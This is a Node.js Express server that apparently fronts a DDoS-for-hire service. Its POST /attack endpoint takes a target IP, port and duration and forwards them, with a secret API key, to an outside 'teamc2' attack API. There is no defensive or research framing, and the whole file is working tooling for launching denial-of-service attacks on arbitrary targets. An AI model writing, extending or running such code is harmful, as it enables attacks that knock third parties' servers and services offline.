const express = require("express");
const axios = require("axios");
const cors = require("cors");
require("dotenv").config();

const app = express();
app.use(cors());
app.use(express.json());

// 🔐 put your real key
const API_KEY = process.env.API_KEY;
const PORT = process.env.PORT;

app.post("/attack", async (req, res) => {
  try {
    const { ip, port, time } = req.body;

    // ✅ validation fix
    if (!ip || !port || !time) {
      return res.status(400).json({ error: "Missing params" });
    }

    // ✅ template string fix
    const url = `https://app.teamc2.xyz/api/attack?api_key=${API_KEY}&target=${ip}&port=${port}&time=${time}&concurrent=1`;

    const response = await axios.get(url);

    res.json({
      success: true,
      data: response.data
    });

  } catch (err) {
    console.error(err.message);
    res.status(500).json({ error: "Server error" });
  }
});

app.listen(5000, () => {
  console.log("Server running on port 5000");
});